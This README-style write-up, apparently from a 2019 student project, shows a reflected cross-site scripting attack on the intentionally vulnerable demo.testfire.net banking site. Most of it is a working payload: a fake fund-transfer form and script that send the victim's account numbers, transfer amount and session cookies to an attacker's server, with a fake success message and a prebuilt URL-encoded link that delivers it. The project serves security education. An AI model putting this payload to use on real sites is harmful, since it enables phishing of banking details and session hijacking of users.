# About
Cross Site Scripting attack on an already logged in user.
This is done on a website which is made intentionally vulnerable.
https://demo.testfire.net/<br>
**This is only for learning purposes.**
## Note:
Below is the script, execute this on any input form eg (Search, feedback) of the given website.
You must have local server setup, here it is node server localhost:3000. code is uploaded clone it and run on your system.

Here we are getting user's money transfer information by using fake transfer form which users would not be able notice and they will transfer money to the accounts and all those transfer details are sent to the local server of the attacker.

# Execution

```javascript
<form id="tForm" name="tForm" method="post" action="doTransfer" onsubmit="return (confirminput(tForm));"><h1>Transfer Funds</h1><table width="100%" cellspacing="0" cellpadding="1" border="0"><tbody><tr><td><strong>From Account:</strong></td><td><select size="1" id="fromAccount" name="fromAccount"><option value="800000">800000 Corporate</option><option value="800001">800001 Checking</option></select></td></tr><tr><td><strong>To Account:</strong></td><td><select size="1" id="toAccount" name="toAccount"><option value="800000">800000 Corporate</option><option value="800001">800001 Checking</option></select></td></tr><tr><td><strong> Amount to Transfer:</strong></td><td><input type="text" id="transferAmount" name="transferAmount"></td></tr><tr><td colspan="2" align="center"><input type="button" name="transfer" onclick= "showTransaction()" value="Transfer Money" id="transfer"></td></tr><tr><td colspan="2">&nbsp;</td></tr><tr><td colspan="2" align="center"><span id="_ctl0__ctl0_Content_Main_postResp" align="center"><span style="color: Red"></span></span></span></td></tr></tbody></table></form>

<script type="text/javascript">
    document.getElementsByClassName("fl")[0].children[0].textContent = "";
    document.getElementsByClassName("fl")[0].children[1].textContent = "";
    var today = new Date();
    var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
    var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
    var dateTime = date+' '+time;
    function showTransaction()
    {
        new Image().src='http://localhost:3000/?FromAccount='+document.forms["tForm"].fromAccount.value
        +'&ToAccount='+document.forms["tForm"].toAccount.value
        +'&TransferMoney='+document.forms["tForm"].transferAmount.value+'&'+document.cookie;
        
        document.getElementById("_ctl0__ctl0_Content_Main_postResp").children[0].textContent = document.forms["tForm"].transferAmount.value
        +".0 was successfully transferred from Account "+ document.forms["tForm"].fromAccount.value+ " into Account "
        + document.forms["tForm"].toAccount.value + " at "+dateTime;
    }   
</script>
```

## Direct link to get to the fake form
<a href="https://demo.testfire.net/search.jsp?query=%3Cform+id%3D%22tForm%22+name%3D%22tForm%22+method%3D%22post%22+action%3D%22doTransfer%22+onsubmit%3D%22return+%28confirminput%28tForm%29%29%3B%22%3E%3Ch1%3ETransfer+Funds%3C%2Fh1%3E%3Ctable+width%3D%22100%25%22+cellspacing%3D%220%22+cellpadding%3D%221%22+border%3D%220%22%3E%3Ctbody%3E%3Ctr%3E%3Ctd%3E%3Cstrong%3EFrom+Account%3A%3C%2Fstrong%3E%3C%2Ftd%3E%3Ctd%3E%3Cselect+size%3D%221%22+id%3D%22fromAccount%22+name%3D%22fromAccount%22%3E%3Coption+value%3D%22800000%22%3E800000+Corporate%3C%2Foption%3E%3Coption+value%3D%22800001%22%3E800001+Checking%3C%2Foption%3E%3C%2Fselect%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3E%3Cstrong%3ETo+Account%3A%3C%2Fstrong%3E%3C%2Ftd%3E%3Ctd%3E%3Cselect+size%3D%221%22+id%3D%22toAccount%22+name%3D%22toAccount%22%3E%3Coption+value%3D%22800000%22%3E800000+Corporate%3C%2Foption%3E%3Coption+value%3D%22800001%22%3E800001+Checking%3C%2Foption%3E%3C%2Fselect%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd%3E%3Cstrong%3E+Amount+to+Transfer%3A%3C%2Fstrong%3E%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22text%22+id%3D%22transferAmount%22+name%3D%22transferAmount%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd+colspan%3D%222%22+align%3D%22center%22%3E%3Cinput+type%3D%22button%22+name%3D%22transfer%22+onclick%3D+%22showTransaction%28%29%22+value%3D%22Transfer+Money%22+id%3D%22transfer%22%3E%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd+colspan%3D%222%22%3E%26nbsp%3B%3C%2Ftd%3E%3C%2Ftr%3E%3Ctr%3E%3Ctd+colspan%3D%222%22+align%3D%22center%22%3E%3Cspan+id%3D%22_ctl0__ctl0_Content_Main_postResp%22+align%3D%22center%22%3E%3Cspan+style%3D%22color%3A+Red%22%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftbody%3E%3C%2Ftable%3E%3C%2Fform%3E++%3Cscript+type%3D%22text%2Fjavascript%22%3E+++++document.getElementsByClassName%28%22fl%22%29%5B0%5D.children%5B0%5D.textContent+%3D+%22%22%3B+++++document.getElementsByClassName%28%22fl%22%29%5B0%5D.children%5B1%5D.textContent+%3D+%22%22%3B+++++var+today+%3D+new+Date%28%29%3B+++++var+date+%3D+today.getFullYear%28%29%2B%27-%27%2B%28today.getMonth%28%29%2B1%29%2B%27-%27%2Btoday.getDate%28%29%3B+++++var+time+%3D+today.getHours%28%29+%2B+%22%3A%22+%2B+today.getMinutes%28%29+%2B+%22%3A%22+%2B+today.getSeconds%28%29%3B+++++var+dateTime+%3D+date%2B%27+%27%2Btime%3B+++++function+showTransaction%28%29+++++%7B+++++++++new+Image%28%29.src%3D%27http%3A%2F%2Flocalhost%3A3000%2F%3FFromAccount%3D%27%2Bdocument.forms%5B%22tForm%22%5D.fromAccount.value+++++++++%2B%27%26ToAccount%3D%27%2Bdocument.forms%5B%22tForm%22%5D.toAccount.value+++++++++%2B%27%26TransferMoney%3D%27%2Bdocument.forms%5B%22tForm%22%5D.transferAmount.value%2B%27%26%27%2Bdocument.cookie%3B++++++++++++++++++document.getElementById%28%22_ctl0__ctl0_Content_Main_postResp%22%29.children%5B0%5D.textContent+%3D+document.forms%5B%22tForm%22%5D.transferAmount.value+++++++++%2B%22.0+was+successfully+transferred+from+Account+%22%2B+document.forms%5B%22tForm%22%5D.fromAccount.value%2B+%22+into+Account+%22+++++++++%2B+document.forms%5B%22tForm%22%5D.toAccount.value+%2B+%22+at+%22%2BdateTime%3B+++++%7D+++++%3C%2Fscript%3E">Demo Link for fake Transaction</a>

# Authors

Ashkan Es Haghi <br>
Alexander Grissinger <br>
Muddassir Hussain <br>

# Project Date
08.11.2019
